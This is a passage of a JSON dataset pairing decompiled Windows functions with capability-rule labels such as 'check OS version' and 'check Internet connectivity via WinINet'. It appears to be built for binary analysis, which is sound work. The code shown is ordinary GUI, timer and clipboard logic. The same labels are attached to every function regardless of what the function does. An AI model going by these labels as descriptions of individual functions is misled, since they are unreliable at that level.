        "decompiled_code": "\nvoid fcn.0047ccac(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar in_ZF;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x47ccc0;\n    fcn.00405894();\n    if (!in_ZF) {\n        puStack20 = 0x47cccc;\n        fcn.004054c0();\n        if (*(in_EAX + 0x122) == 0) {\n            puStack20 = 0x47ccf4;\n            fcn.00451a84();\n            puStack20 = 0x47cd01;\n            fcn.0046ee50();\n            uStack24 = 0x47cd31;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            fcn.0040483c();\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x47cd38;\n            uStack24 = 0x47cd30;\n            fcn.00404640();\n            return;\n        }\n        puStack20 = 0x47cce4;\n        (**(in_EAX + 0x120))();\n    }\n    return;\n}\n",
        "token_count": 301
    },
    "0047cd9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047cd9c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.004799dc();\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.004799c8();\n                if (*(iVar3 + 0x57) != '\\0') {\n                    if ((*(iVar3 + 0x1c4) == 0) || (cVar1 = fcn.00466fb4(),  cVar1 == '\\0')) {\ncode_r0x0047ce03:\n                        fcn.0047cd40(&stack0xfffffffc);\n                        return;\n                    }\n                    fcn.00466ca8(*(iVar3 + 0x1c4));\n                    iVar3 = sub.user32.dll_IsChild();\n                    if (iVar3 == 0) goto code_r0x0047ce03;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.0047cd40(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "0047ce24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0047ce24(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX;\n    if (*(in_EAX + 0x4c) == 0) {\n        fcn.00406f3c();\n        uVar1 = fcn.0044dfd4();\n    }\n    return uVar1 & 0xffffff00 | *(in_EAX + 0x4c) != 0;\n}\n",
        "token_count": 110
    },
    "0047ce44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047ce44(uchar param_1, uint param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    fcn.0047ce88();\n    uVar1 = sub.user32.dll_SetTimer(0, 0, param_2, fcn.0047a600);\n    *(in_EAX + 0x8a) = uVar1;\n    *(in_EAX + 0x89) = param_1;\n    if (*(in_EAX + 0x8a) == 0) {\n        fcn.0047d07c();\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "0047d07c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047d07c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.0047d008();\n        *(in_EAX + 0x60) = 0;\n        *(in_EAX + 0x58) = 0;\n        fcn.0047a768();\n        fcn.0047ce88();\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "0047d0b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0047d0b4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint *puStack64;\n    uint uStack60;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uStack60 = 0xe;\n    puStack64 = 0x47d0c8;\n    var_4h = (***0x4a4d4c)();\n    puStack64 = &fcn.0047d0b4::var_28h;\n    uStack68 = 0x47d0d4;\n    uStack68 = sub.user32.dll_GetCursor();\n    puStack72 = 0x47d0da;\n    iVar2 = sub.user32.dll_GetIconInfo();\n    if (iVar2 != 0) {\n        uStack76 = 0x47d1f8;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack84 = 0x47d0fe;\n        puStack72 = &stack0xfffffffc;\n        fcn.00429e20();\n        puStack84 = 0x47d109;\n        iVar2 = fcn.00402ed8();\n        uStack88 = 0x47d1c9;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        var_8h = iVar2 + var_8h;\n        puStack84 = &stack0xfffffffc;\n        var_10h = iVar2;\n        cVar1 = fcn.00429edc(var_8h);\n        if ((cVar1 != '\\0') && (*(var_10h + 0xe) == 1)) {\n            uVar3 = *(iVar2 + 4) * *(iVar2 + 0xe) + 0x1f & 0xffffffe0;\n            if (uVar3 < 0) {\n                uVar3 = uVar3 + 7;\n            }\n            var_14h = uVar3 >> 3;\n            var_4h = fcn.0047d0a4();\n            if ((var_4h == 0) && (SBORROW4(*(iVar2 + 8), *(iVar2 + 4) * 2) == *(iVar2 + 8) + *(iVar2 + 4) * -2 < 0)) {\n                var_4h = fcn.0047d0a4();\n            }\n            var_4h = var_4h / var_14h - var_20h;\n        }\n        *in_FS_OFFSET = var_8h;\n        uStack88 = 0x47d1d0;\n        iStack92 = 0x47d1c8;\n        iVar2 = fcn.00402f0c();\n        return iVar2;\n    }\n    return var_4h;\n}\n",
        "token_count": 756
    },
    "0047d26c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047d26c(uint arg_8h)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x47d30a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_8h = 0;\n    if (in_EAX != NULL) {\n        while (*in_EAX != '\\0') {\n            while (((cVar1 = *in_EAX,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r'))) {\n                in_EAX = fcn.0040e66c();\n            }\n            fcn.0040555c();\n            iVar2 = fcn.004289bc();\n            if (var_8h < iVar2) {\n                var_8h = iVar2;\n            }\n            if (*in_EAX == '\\r') {\n                in_EAX = in_EAX + 1;\n            }\n            if (*in_EAX == '\\n') {\n                in_EAX = in_EAX + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x47d311;\n    uStack32 = 0x47d309;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 357
    },
    "0047d31c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047d31c(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_6dh;\n    int32_t var_65h;\n    char var_5dh;\n    uint lpPoint;\n    uint var_58h;\n    uint dx;\n    uint dy;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint lprc;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4ch = *param_2;\n    var_48h = param_2[1];\n    var_4h = in_EAX;\n    fcn.00405f08();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    *(var_4h + 0x58) = 0;\n    var_14h = 0;\n    if ((*(var_4h + 0x88) != '\\0') && (*(var_4h + 0x60) != 0)) {\n        fcn.0047de84();\n        cVar2 = fcn.0047170c();\n        if (cVar2 != '\\0') {\n            fcn.0045d4bc();\n            iVar4 = fcn.0047a5e0();\n            if (iVar4 == *(var_4h + 0x60)) {\n                var_44h = *(var_4h + 0x60);\n                var_3ch = var_4ch;\n                var_38h = var_48h;\n                iVar4 = fcn.0047d0b4();\n                var_38h = var_38h + iVar4;\n                var_34h = fcn.0047995c();\n                var_30h = *(var_4h + 0x5c);\n                fcn.0045e864();\n                (**(**(var_4h + 0x60) + 0x40))();\n                lpPoint = 0;\n                var_58h = 0;\n                piVar1 = *(*(var_4h + 0x60) + 0x30);\n                if (piVar1 == NULL) {\n                    iVar4 = *(var_4h + 0x60);\n                    cVar2 = fcn.004047cc();\n                    if ((cVar2 != '\\0') && (*(iVar4 + 0x1c4) != 0)) {\n                        sub.user32.dll_ClientToScreen();\n                    }\n                }\n                else {\n                    (**(*piVar1 + 0x40))();\n                }\n                sub.user32.dll_OffsetRect();\n                fcn.0045ea84();\n                fcn.0047a5a8();\n                fcn.0045bc14();\n                fcn.00405504();\n                var_10h = *(var_4h + 0x74);\n                var_40h = *0x4a48e8;\n                var_8h = 0;\n                arg_8h = &var_44h;\n                iVar4 = fcn.004601fc(arg_8h);\n                var_5dh = iVar4 == 0;\n                if ((var_5dh) && (*(var_4h + 0x15a) != 0)) {\n                    (**(var_4h + 0x158))(&var_44h);\n                }\n                if ((var_5dh == '\\0') || (*(var_4h + 0x60) == 0)) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = 1;\n                }\n                *(var_4h + 0x58) = uVar3;\n                if ((*(var_4h + 0x58) != '\\0') && (var_ch != 0)) {\n                    fcn.0047d20c(&stack0xfffffffc);\n                    (**(**(var_4h + 0x84) + 0x74))();\n                    (**(**(var_4h + 0x84) + 0xe8))(&var_6dh, var_8h);\n                    sub.user32.dll_OffsetRect(&var_6dh, var_3ch, var_38h);\n                    cVar2 = fcn.0040483c();\n                    if (cVar2 != '\\0') {\n                        iVar4 = fcn.0047d26c(&stack0xfffffffc);\n                        var_6dh = var_6dh - (iVar4 + 5);\n                        var_65h = var_65h - (iVar4 + 5);\n                    }\n                    fcn.0045e9d4();\n                    *(var_4h + 100) = var_88h;\n                    *(var_4h + 0x68) = var_84h;\n                    fcn.0045e9d4();\n                    *(var_4h + 0x6c) = var_88h;\n                    *(var_4h + 0x70) = var_84h;\n                    fcn.0045f0b8();\n                    (**(**(var_4h + 0x84) + 0xe4))(var_8h);\n                    fcn.0047a6f4();\n                    if (var_14h < 1) {\n                        fcn.0047ce44();\n                    }\n                    else {\n                        fcn.0047ce44();\n                    }\n                    goto code_r0x0047d67e;\n                }\n            }\n        }\n    }\n    if (var_14h < 1) {\n        fcn.0047d07c();\n    }\n    else {\n        fcn.0047ce44();\n    }\ncode_r0x0047d67e:\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405490();\n    fcn.00405fd8();\n    return;\n}\n",
        "token_count": 1461
    },
    "0047d6b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0047d6b8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.0040669c(param_1);\n        if (iVar1 <= iVar2) break;\n        if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n            uVar3 = *(*(in_EAX + 0xd0) + iVar2 * 0xc);\n            goto code_r0x0047d776;\n        }\n        if (*(*(in_EAX + 0xd0) + iVar2 * 0xc) == -1) break;\n        iVar2 = iVar2 + 1;\n    }\n    uVar3 = *(in_EAX + 0xcc);\n    *(in_EAX + 0xcc) = *(in_EAX + 0xcc) + 1;\n    iVar1 = fcn.0040669c();\n    if (iVar1 <= iVar2) {\n        iVar2 = fcn.0040669c();\n        fcn.00406858(iVar2 + 1);\n    }\n    *(*(in_EAX + 0xd0) + iVar2 * 0xc) = uVar3;\n    *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = param_2;\n    *(*(in_EAX + 0xd0) + 8 + iVar2 * 0xc) = *(param_2 + 0x344) != 0;\ncode_r0x0047d776:\n    return CONCAT44(uVar3, uVar3);\n}\n",
        "token_count": 401
    },
    "0047d780": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047d780(void)\n\n{\n    if ((*(*0x4ab07c + 0x68) == 0) || (*(*(*0x4ab07c + 0x68) + 0x284) == 0)) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0047d7bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0047d7bc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0xf2) != 0) {\n        (**(in_EAX + 0xf0))();\n    }\n    iVar1 = sub.user32.dll_GetActiveWindow();\n    if (iVar1 == 0) {\n        sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n    }\n    return CONCAT44(iVar1, iVar1);\n}\n",
        "token_count": 116
    },
    "0047d804": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0047d804(void)\n\n{\n    int32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = 0;\n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uStack8 = fcn.00466ca8();\n    }\n    return CONCAT44(uStack8, uStack8);\n}\n",
        "token_count": 111
    },
    "0047d844": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0047d844(int32_t param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uStack24;\n    \n    iVar4 = *(*0x4ab07c + 0x68);\n    if (iVar4 == 0) {\ncode_r0x0047d86f:\n        if ((iVar4 != *(in_EAX + 0x44)) && (*(in_EAX + 0x44) != 0)) {\n            iVar4 = fcn.004601fc(param_1);\n            if (iVar4 == 1) goto code_r0x0047d88f;\n        }\n        uVar1 = 0;\n    }\n    else {\n        iVar3 = fcn.004601fc(param_1);\n        if (iVar3 != 1) goto code_r0x0047d86f;\ncode_r0x0047d88f:\n        uVar1 = 1;\n    }\n    uStack24 = param_2 & 0xffffff00 | uVar1;\n    if (uVar1 == 0) {\n        cVar2 = fcn.004047cc();\n        if ((((cVar2 != '\\0') && (*(param_1 + 0x6a) != '\\0')) && (*(param_1 + 0x60) != '\\0')) &&\n           ((*(param_1 + 0x1c) & 0x10) == 0)) {\n            fcn.0046ed14();\n        }\n    }\n    return CONCAT44(uStack24, uStack24) & 0xffffffff000000ff;\n}\n",
        "token_count": 386
    },
    "0047d8dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0047d8dc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))();\n    }\n    return 0;\n}\n",
        "token_count": 59
    },
    "0047d904": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0047d904(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xe2) != 0) {\n        (**(in_EAX + 0xe0))();\n    }\n    return 0;\n}\n",
        "token_count": 59
    },
    "0047dac8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047dac8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.004501e8();\n    if ((cVar1 == '\\0') || (cVar1 = fcn.00466fb4(),  cVar1 == '\\0')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            uVar3 = fcn.00466ca8(0, 0xffffffff);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n    }\n    else {\n        iVar2 = fcn.0047da14();\n        if (*(iVar2 + 8) == '\\0') {\n            fcn.00403ae4();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            fcn.00466ca8();\n            fcn.004500bc();\n            (**(*in_EAX + 0x80))();\n        }\n        else {\n            uVar3 = fcn.00466ca8(0, 0xffffffff);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "0047dd00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0047dd00(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 8) != '\\0') {\n        cVar1 = fcn.004501e8();\n        if ((cVar1 != '\\0') &&\n           ((((*(in_EAX + 0x28) != '\\0' || (*(in_EAX + 0xc) != 0)) || (*(in_EAX + 0x10) != 0)) ||\n            ((*(in_EAX + 0x14) != 0 || (*(in_EAX + 0x18) != 0)))))) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 159
    },
    "0047dd38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047dd38(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 2)) {\n        *(in_EAX + 2) = param_2;\n        if ((*(in_EAX + 2) != '\\0') && (*(in_EAX[1] + 0x350) != '\\0')) {\n            fcn.0047911c();\n        }\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "0047ddfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047ddfc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00471334();\n    if (iVar1 != 0) {\n        *0x4ab088 = 0;\n        sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n        if ((*(*(in_EAX + 0x44) + 0x273) == '\\x01') && (*(*(in_EAX + 0x44) + 0x57) == '\\0')) {\n            fcn.0047598c();\n            fcn.00478784();\n        }\n        fcn.0047b068();\n        fcn.0047b1c4();\n        if (*(*0x4ab07c + 100) != 0) {\n            uVar2 = fcn.00466ca8();\n            sub.user32.dll_SetFocus(uVar2);\n        }\n        if (*(in_EAX + 0x14a) != 0) {\n            (**(in_EAX + 0x148))();\n        }\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "0047de9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047de9c(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x47deff;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    *0x4ab080 = *0x4ab080 + 1;\n    if (*0x4ab080 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x4ab078 != 0) {\n            iStack20 = 0x47dec3;\n            fcn.00471470();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x4ab090 != 0) {\n            iStack20 = *0x4ab090;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        fcn.00419144();\n        fcn.00406864();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 269
    },
    "0047dfe4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047dfe4(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((in_EAX[1] != 0) && (*(in_EAX + 0xd) == '\\0')) {\n        (**(*in_EAX + 0x10))();\n        *(in_EAX + 0xd) = 1;\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "0047e18c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047e18c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hMem;\n    uint var_4h;\n    \n    uStack20 = 0x47e1a0;\n    (**(*in_EAX + 0x18))();\n    uStack20 = 1;\n    puStack24 = 0x47e1a7;\n    iVar1 = sub.user32.dll_GetClipboardData();\n    uStack28 = 0x47e1fe;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (iVar1 == 0) {\n        iStack36 = 0x47e1d9;\n        puStack24 = &stack0xfffffffc;\n        fcn.0040546c();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        sub.kernel32.dll_GlobalLock();\n        fcn.00405664();\n        iStack36 = iVar1;\n    }\n    *in_FS_OFFSET = iStack36;\n    uStack28 = 0x47e205;\n    if (iVar1 != 0) {\n        iStack32 = iVar1;\n        sub.kernel32.dll_GlobalUnlock();\n    }\n    (**(*in_EAX + 0x14))();\n    return;\n}\n",
        "token_count": 336
    },
    "0047e424": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047e424(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc8;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_10h;\n    ushort uFormat;\n    uint hMem;\n    int32_t *var_4h;\n    \n    puStack28 = 0x47e438;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x47e499;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.0047dfe4();\n    var_10h = 0;\n    fcn.0042ac84(&fcn.0047e424::var_10h);\n    sub.user32.dll_SetClipboardData(uFormat, hMem);\n    if (var_10h != 0) {\n        in_stack_ffffffc8 = 9;\n        sub.user32.dll_SetClipboardData(9, var_10h);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    (**(*var_4h + 0x14))(0x47e4a0);\n    return;\n}\n",
        "token_count": 299
    },
    "0047e4a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047e4a8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc8;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_10h;\n    ushort uFormat;\n    uint hMem;\n    int32_t *var_4h;\n    \n    puStack28 = 0x47e4bc;\n    var_4h = in_EAX;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x47e51d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.0047dfe4();\n    var_10h = 0;\n    (**(*param_2 + 0x60))(&fcn.0047e4a8::var_10h);\n    sub.user32.dll_SetClipboardData(uFormat, hMem);\n    if (var_10h != 0) {\n        in_stack_ffffffc8 = 9;\n        sub.user32.dll_SetClipboardData(9, var_10h);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    (**(*var_4h + 0x14))(0x47e524);\n    return;\n}\n",
        "token_count": 320
    },
    "0047e684": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0047e684(void)\n\n{\n    if (*0x4ab0b4 == 0) {\n        *0x4ab0b4 = fcn.00404610();\n    }\n    return *0x4ab0b4;\n}\n",
        "token_count": 60
    },
    "0047e850": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
